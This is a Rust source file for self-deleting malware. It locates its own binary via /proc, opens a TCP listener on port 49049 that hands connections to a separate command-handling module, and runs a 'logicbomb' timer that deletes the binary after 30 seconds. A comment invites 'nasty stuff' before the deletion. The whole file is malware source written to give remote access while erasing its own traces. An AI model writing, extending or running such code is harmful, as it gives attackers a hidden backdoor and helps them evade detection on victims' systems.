use std::{
    error::Error,
    fs,
    path::{self, PathBuf},
    process, thread, time,
};
mod operations;

fn delete(abs_path: &PathBuf) -> Result<(), Box<dyn Error>> {
    /*Deletes the path of the binary*/
    fs::remove_file(abs_path)?;
    Ok(())
}

fn get_malware_path() -> Result<path::PathBuf, Box<dyn Error>> {
    /*In Linux, we can get the path of a binary
     * from /proc/PID/exe, which is a symlink to
     * the binary.
     *
     * This will be the path that the software to use to delete the binary.
     * */
    let pid = process::id();
    let formatted = format!("/proc/{pid}/exe");

    let path = fs::read_link(path::PathBuf::from(formatted))?;
    match fs::exists(&path) {
        Ok(_v) => eprintln!("binary found @ {}", &path.to_string_lossy()),
        Err(_e) => {
            eprintln!("failed to get legitimate binary path.");
            let _ = get_malware_path();
        }
    }
    Ok(path)
}

fn timer(count: u64, max_count: u64) -> bool {
    /* Sleeps for `x` seconds.
     * In later versions, replace this with just a sleep timer
     * using chrono and then use the timestamp from the unix timestamp
     * to delete the file in main.
     * */
    let mut logicbomb = false;
    if count == max_count {
        logicbomb = true;
        /* You can do nasty stuff here
        before deleting the binary. */
    }
    logicbomb
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    /* Main Function */
    eprintln!("Started self-deleting malware testing.");
    let mut bin_path: path::PathBuf = match get_malware_path() {
        Ok(v) => v,
        Err(e) => {
            eprintln!("can't get path to binary: {e}");
            PathBuf::from("")
        }
    };

    let pid = process::id();
    let listener = tokio::net::TcpListener::bind("0.0.0.0:49049").await?;
    eprintln!("tcp server started at 49049");
    tokio::task::spawn(async move {
        loop {
            let (socket, _) = match listener.accept().await {
                Ok((v, e)) => (v, e),
                Err(_) => {
                    eprintln!("exiting");
                    std::process::exit(1)
                }
            };
            match operations::onstart::init(socket).await {
                Ok(command_out) => {
                    println!("{:?}", command_out)
                }
                Err(_) => eprintln!("disconnected"),
            }
        }
    });

    // thread to continue counting.
    let timer = tokio::task::spawn_blocking(move || {
        dbg!(&bin_path, pid);

        let mut counter: u64 = 0;
        loop {
            bin_path = get_malware_path().expect("something went wrong within the thread");
            if timer(counter, 30) {
                match delete(&bin_path) {
                    Ok(()) => (),
                    Err(e) => eprintln!("{e}"),
                }
                break;
            }
            // sleep 1 second.
            thread::sleep(time::Duration::from_secs(1));
            counter += 1;
        }
    });

    tokio::join!(timer).0.unwrap();
    Ok(())
}
